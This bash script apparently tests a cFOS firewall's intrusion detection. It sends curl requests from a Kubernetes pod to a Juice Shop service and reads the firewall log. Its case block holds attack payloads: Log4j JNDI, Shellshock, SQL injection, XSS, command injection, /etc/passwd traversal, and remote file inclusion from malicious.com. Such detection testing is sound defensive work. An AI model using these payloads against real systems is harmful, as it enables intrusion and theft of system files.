#!/bin/bash

# Function to run curl command inside the pod
run_curl_in_pod() {
    # Parameters
    LOCAL_CURL_COMMAND="$1"
    JUICE_SHOP_SVC="$2"

    # Using local variables to get label and namespace from test_diag2 scope
    local pod_label_selector="${label_selector_source_pod}"
    local pod_namespace="${namespace_source_pod}"

    # Get the pod name with the specified label selector and namespace
    POD_NAME=$(kubectl get pods -n "$pod_namespace" -l "$pod_label_selector" -o jsonpath='{.items[0].metadata.name}')

    if [ -z "$POD_NAME" ]; then
        echo "No pod found with label '$pod_label_selector' in namespace '$pod_namespace'"
        exit 1
    fi

    # Run the curl command inside the pod
    echo "kubectl exec $POD_NAME --namespace $pod_namespace -- bash -c \"$LOCAL_CURL_COMMAND $JUICE_SHOP_SVC\""
    echo "waiting result"
    kubectl exec $POD_NAME --namespace "$pod_namespace" -- bash -c "$LOCAL_CURL_COMMAND $JUICE_SHOP_SVC"
    sleep 2
}


function test_diag2() {
    # Parameters from command line - now all 4 are expected from CLI, with defaults inside function
    label_selector_source_pod="${1:-app=diag2}"
    namespace_source_pod="${2:-backend}"
    target_svc_name="${3:-juiceshop-service}"
    target_svc_namespace="${4:-security}"
    payload_type="${5:-normal}"
    logfile_name="${6:-traffic.0}"

    # Define the Juice Shop service address in a variable using parameters
    local service_address="http://${target_svc_name}.${target_svc_namespace}.svc.cluster.local:3000/"
    local cfos_pod_name=$(kubectl get pods -l app=firewall -o jsonpath='{.items[0].metadata.name}')

   


    case "$payload_type" in
    normal)
        local payload='curl -s -I --max-time 5'
        local logfile_name="traffic.0"
        ;;
    log4j)
        local payload='curl -s --max-time 5 -H "User-Agent: \${jndi:ldap://example.com/a}"'
        local logfile_name="ips.0"
        ;;
    shellshock)
        local payload='curl -s --max-time 5 -H "User-Agent: () { :; }; /bin/ls"'
        local logfile_name="ips.0"
        ;;
    sql_injection)
        local payload='curl -s --max-time 5 --data "username=admin&password= OR 1=1 -- -"'
        local logfile_name="ips.0"
        ;;
    xss)
        local payload='curl -s --max-time 5 --data "search=<script>alert(1)</script>"'
        local logfile_name="ips.0"
        ;;
    lfi)
        local payload='curl -s --max-time 5 "http://target.com/index.php?page=../../../../etc/passwd"'
        local logfile_name="ips.0"
        ;;
    rfi)
        local payload='curl -s --max-time 5 "http://target.com/index.php?page=http://malicious.com/shell.txt"'
        local logfile_name="ips.0"
        ;;
    cmd_injection)
        local payload='curl -s --max-time 5 --data "input=1; cat /etc/passwd"'
        local logfile_name="ips.0"
        ;;
    directory_traversal)
        local payload='curl -s --max-time 5 "http://target.com/../../../../etc/passwd"'
        local logfile_name="ips.0"
        ;;
    user_agent_malware)
        local payload='curl -s --max-time 5 -H "User-Agent: BlackSun"'
        local logfile_name="ips.0"
        ;;
    *)
        local payload='curl -s -I --max-time 5'
        local logfile_name="ips.0"
        ;;
esac


    run_curl_in_pod "$payload" "$service_address"
    echo "kubectl exec -it po/${cfos_pod_name} -c cfos -- tail -n -1 /var/log/log/${logfile_name}"
    kubectl exec -it po/${cfos_pod_name} -c cfos -- tail -n -1 /var/log/log/${logfile_name}

}

function print_usage() {
    echo "Usage: $0 [source_pod_label] [source_pod_namespace] [target_service_name] [target_service_namespace]"
    echo ""
    echo "This script executes a curl command from inside a specified source pod"
    echo "and tails the traffic log of a cfos firewall pod."
    echo ""
    echo "Parameters (all optional):"
    echo "  [source_pod_label]        : Label selector for the source pod. Default: app=diag2"
    echo "  [source_pod_namespace]    : Namespace of the source pod.    Default: backend"
    echo "  [target_service_name]     : Name of the target service.       Default: juiceshop"
    echo "  [target_service_namespace]: Namespace of the target service.  Default: security"
    echo "  [traffic type]:             traffic type of log4j,shellshock,normal, Default:normal"
    echo "  [traffic type]:    xss,lfi,rfi,user_agent_malware,directory_traversal,sql_injection"
    echo "  [logfilename]:             traffic type of log4j,shellshock,normal, Default:traffic.0"
    echo ""
    echo "Example usages:"
    echo "  # Run with all default parameters:"
    echo "  $0"
    echo ""
    echo "  # Specify only target service name and namespace:"
    echo "  $0  '' '' my-new-service  prod-namespace"
    echo ""
    echo "  # Specify all parameters:"
    echo "  $0  'app=diag' 'default' 'diag2-service' 'backend' 'shellshock' 'ips.0'"
    echo ""
    exit 1
}

# Check if help is requested or no arguments are provided
if [ "$1" == "-h" ] || [ "$1" == "--help" ]; then
    print_usage
fi

# Call test_diag2 function to execute it when the script runs, passing command line arguments
echo sending traffic with format like  ./testdemo.sh  'app=diag' 'default' 'diag2-service' 'backend' 'shellshock' 'ips.0' 
echo default is ./testdemo.sh 'app=diag2' 'backend' 'juiceshop-service' 'security' 'normal'
echo use ./testdemo.sh -h for help
test_diag2 "$@"
